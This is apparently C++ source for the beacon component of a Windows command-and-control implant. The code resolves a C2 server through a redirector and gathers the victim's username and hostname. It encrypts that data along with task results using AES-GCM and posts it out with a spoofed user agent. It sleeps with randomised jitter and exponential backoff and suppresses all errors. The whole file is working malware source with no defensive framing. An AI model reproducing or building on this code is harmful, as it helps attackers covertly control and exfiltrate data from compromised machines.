#include "Beacon.h"
#include "../core/Config.h"
#include "../core/ImplantId.h"
#include "../crypto/AesGcm.h"
#include "../http/RedirectorResolver.h"
#include "../http/WinHttpClient.h"
#include "../external/nlohmann/json.hpp"
#include <chrono>
#include <random>
#include <thread>
#include <vector>
#include <algorithm>
#include <iterator>
#include <windows.h>
#include <winhttp.h>

namespace {
    std::string getUsername() {
        DWORD username_len = 0;
        GetUserNameW(NULL, &username_len);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::vector<wchar_t> username(username_len);
            if (GetUserNameW(username.data(), &username_len)) {
                int len = WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, NULL, 0, NULL, NULL);
                std::string result(len, 0);
                WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, &result[0], len, NULL, NULL);
                return result;
            }
        }
        return "Unknown";
    }

    std::string getHostname() {
        DWORD hostname_len = 0;
        GetComputerNameW(NULL, &hostname_len);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::vector<wchar_t> hostname(hostname_len);
            if (GetComputerNameW(hostname.data(), &hostname_len)) {
                int len = WideCharToMultiByte(CP_UTF8, 0, hostname.data(), hostname_len, NULL, 0, NULL, NULL);
                std::string result(len, 0);
                WideCharToMultiByte(CP_UTF8, 0, hostname.data(), hostname_len, &result[0], len, NULL, NULL);
                return result;
            }
        }
        return "Unknown";
    }
}

namespace beacon {

Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF) {
    implantId_ = core::generateImplantId();
}

void Beacon::sleepWithJitter() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::normal_distribution<> d(core::SLEEP_BASE, core::SLEEP_BASE * (core::JITTER_PCT / 100.0));
    double sleep_duration = std::max(3.0, d(gen));
    std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<int>(sleep_duration * 1000)));
}

void Beacon::run() {
    http::RedirectorResolver resolver(core::REDIRECTOR_URL);
    std::vector<BYTE> beacon_key_vec(core::BEACON_KEY, core::BEACON_KEY + 32);
    crypto::AesGcm aes(beacon_key_vec);

    while (true) {
        if (c2Url_.empty()) {
            try {
                c2Url_ = resolver.resolve();
                c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
            } catch (const std::exception&) {
                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                if (c2FetchBackoff_ < 35 * 60) {
                    c2FetchBackoff_ *= 2;
                }
                continue;
            }
        }

        try {
            nlohmann::json payload = {
                {"id", implantId_},
                {"os", "windows"},
                {"arch", "amd64"},
                {"user", getUsername()},
                {"host", getHostname()},
                {"results", nlohmann::json::array()}
            };

            // Move pending results to in-flight
            Result result;
            while (pendingResults_.try_dequeue(result)) {
                inFlightResults_.push_back(result);
            }

            for (const auto& res : inFlightResults_) {
                payload["results"].push_back({
                    {"task_id", res.task_id},
                    {"output", res.output},
                    {"error", res.error}
                });
            }

            std::string payload_str = payload.dump();
            std::vector<BYTE> plaintext(payload_str.begin(), payload_str.end());

            std::vector<BYTE> nonce(12);
            HCRYPTPROV hProv;
            if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                continue;
            }
            if (!CryptGenRandom(hProv, 12, nonce.data())) {
                CryptReleaseContext(hProv, 0);
                continue;
            }
            CryptReleaseContext(hProv, 0);

            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
            std::vector<BYTE> encrypted_payload;
            encrypted_payload.insert(encrypted_payload.end(), nonce.begin(), nonce.end());
            encrypted_payload.insert(encrypted_payload.end(), ciphertext.begin(), ciphertext.end());

            std::wstring wideC2Url(c2Url_.begin(), c2Url_.end());
            URL_COMPONENTSW urlComp;
            wchar_t serverName[256];
            wchar_t path[256];

            memset(&urlComp, 0, sizeof(urlComp));
            urlComp.dwStructSize = sizeof(urlComp);
            urlComp.lpszHostName = serverName;
            urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
            urlComp.lpszUrlPath = path;
            urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);

            if (!WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
                c2Url_ = "";
                continue;
            }

            http::WinHttpClient client(std::wstring(core::USER_AGENTS[0].begin(), core::USER_AGENTS[0].end()));
            std::vector<BYTE> response = client.post(std::wstring(urlComp.lpszHostName), std::wstring(urlComp.lpszUrlPath), encrypted_payload);

            if (response.size() >= 12) {
                std::vector<BYTE> response_nonce(response.begin(), response.begin() + 12);
                std::vector<BYTE> response_ciphertext(response.begin() + 12, response.end());
                std::vector<BYTE> decrypted_response = aes.decrypt(response_ciphertext, response_nonce);

                std::string decrypted_str(decrypted_response.begin(), decrypted_response.end());
                nlohmann::json response_json = nlohmann::json::parse(decrypted_str);

                if (response_json.contains("ack_ids")) {
                    std::vector<std::string> ack_ids = response_json["ack_ids"].get<std::vector<std::string>>();
                    inFlightResults_.erase(
                        std::remove_if(inFlightResults_.begin(), inFlightResults_.end(),
                            [&ack_ids](const Result& res) {
                                return std::find(ack_ids.begin(), ack_ids.end(), res.task_id) != ack_ids.end();
                            }),
                        inFlightResults_.end()
                    );
                }

                // TODO: Process tasks
            }

        } catch (const std::exception&) {
            // Silently continue
        }

        sleepWithJitter();
    }
}

} // namespace beacon
